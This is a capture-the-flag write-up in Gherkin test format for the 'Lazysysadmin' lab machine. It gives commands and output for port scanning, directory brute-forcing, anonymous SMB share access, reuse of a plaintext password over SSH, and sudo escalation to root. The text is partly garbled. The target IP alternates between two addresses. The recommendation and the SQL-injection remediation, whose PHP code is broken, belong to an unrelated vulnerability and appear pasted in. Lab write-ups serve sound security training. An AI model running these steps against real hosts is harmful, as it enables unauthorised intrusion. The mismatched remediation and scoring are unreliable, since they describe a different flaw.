## Version 1.4.1
## language: en

Feature:
  TOE:
    Lazysysadmin
  Category:
    Security Misconfiguration
  Location:
    182.168.0.32:80
  CWE:
    CWE-269: Improper Privilege Management
  Rule:
    REQ.173 Discard unsafe inputs
  Goal:
    Gain root access
  Recommendation:
    OpenEclass version 1.7.2 should be updated to a more recent version

  Background:
  Hacker's software:
    | <Software name> | <Version>   |
    | Kali Linux      | 2020.1      |
    | Firefox Quantum | 68.20esr    |
    | Nmap            | 7.80        |
    | Gobuster        | 3.0.1       |
    | SmbClient       | 4.11.5      |
    | SmbMap          | 2.0         |
  TOE information:
    Given I'm accessing the server 192.168.0.32
    And HTTP is open on port 80
    And is running on Ubuntu 2.8

  Scenario: Normal use case
    Given I'm scanning the server
    """
    $ nmap -sV -p- 182.168.0.32 --open
    """
    When I see the open ports
    """
    22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8
    80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))
    139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
    445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
    3306/tcp open  mysql       MySQL (unauthorized)
    6667/tcp open  irc         InspIRCd
    """
    Then I decide to go port 80 to see the website
    And it's a static website
    When I use the "Gobuster" tool like this
    """
    gobuster dir -u http://192.168.0.32/ -w 
    /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
    -x php,txt,html
    """
    Then I get this result
    """
    /index.html (Status: 200)
    /wordpress (Status: 301)
    /info.php (Status: 200)
    /test (Status: 301)
    /wp (Status: 301)
    /apache (Status: 301)
    /old (Status: 301)
    /javascript (Status: 301)
    /robots.txt (Status: 200)
    /phpmyadmin (Status: 301)
    """
    And I start trying out all the directories
    When I logged into the "/info" directory
    Then I saw that the user Administrator is "webmaster"
    And in the directory "/wordpress" there is a static web
    When I see that the wordpress page repeats the phrase "My name is togie"

  Scenario: Static detection
    Given the vulnerability is unrelated to the code
    Then you can't perform a static detection

  Scenario: Dynamic detection
    Given I've already found useful information, I decide to use "Nessus"
    And it's to do a vulnerability analysis
    When he found an SMB vulnerability with this name
    """
    Microsoft Windows SMB shares unprivileged access
    """
    Then I could use the "Smbclient" tool

  Scenario: Exploitation
    Given that I found a vulnerability
    When I decide to use the "Smbmap" tool
    Then I go to the terminal and I run this
    """
    $ smbmap -H 192.168.0.32
    """
    And it serves to list the shared resources
    When this is the result
    """
    Disk    Permissions     Comment
    ----    -----------     -------
    print$  NO ACCESS       Printer Drivers
    share$  READ ONLY       Sumshare
    IPC$    NO ACCESS       IPC Service (Web server)
    """
    Then we see that there's an interesting resource that is "share$"
    When I execute another instruction and it's this
    """
    $ smbclient //192.168.0.32/share$
    """
    And he lets me in at "share$" but asks me for a password
    When I give click "Enter" without having established a password is success
    Then I check all the files to see if they have anything interesting
    When the only files that caught my eye are these
    """
    deets.txt       N   139 Mon Aug 14 07:20:05 2017
    robots.txt      N   92  Mon Aug 14 07:36:14 2017
    todolist.txt    N   79  Mon Aug 14 07:39:56 2017
    """
    Then I decided to download them this way one by one
    """
    ftp > get deets.txt
    """
    When they're downloaded I decide to read them one by one with "Cat" command
    Then I decide to use the "deets.txt" file since it has this interesting text
    """
    CBF Remembering all these passwords.

    Remember to remove this file and update your 
    password after we push out the server.

    Password 12345
    """
    And I decide to test that password "12345" with SSH
    """
    $ ssh webmaster@192.168.0.32
    """
    When it hasn't worked with the user "webmaster"
    Then I decide to use it with the user "togie"
    And with that user it worked.
    When I place this instruction
    """
    $ sudo -l
    """
    And with the result I decide to execute this
    """
    $ sudo /bin/bsah
    """
    Then I'm already a "root" user...

  Scenario: Remediation
    Given the site is susceptible to SQL injection attacks
    When I decided make this adjustment in the SQL query
    """
    $username = $_POST['uname'];

    $query = $dbConnection->prepare(SELECT user_id, nom, username,
    password, prenom, statut, email, inst_id, iduser is_admin
    FROM user LEFT JOIN admin
    ON user.user_id = admin.iduser WHERE username=?");

    $query->bind_param('u', $username);

    $query->execute();
    """

  Scenario: Scoring
  Severity scoring according to CVSSv3 standard
  Base: Attributes that are constants over time and organizations
    5.2/10 (medium) - AV:L/AC:H/PR:H/UI:N/S:U/C:L/I:H/A:L
  Temporal: Attributes that measure the exploit's popularity and fixability
    4.4/10 (medium) - E:U/RL:O/RC:R/CR:H/IR:M/AR:M
  Environmental: Unique and relevant attributes to a specific user environment
    6.1/10 (medium) - MAV:A/MAC:L/MPR:H/MUI:N/MS:U/MC:L/MI:H/MA:L

  Scenario: Correlations
    Given the version is no longer in use
    Then there is no correlation to date
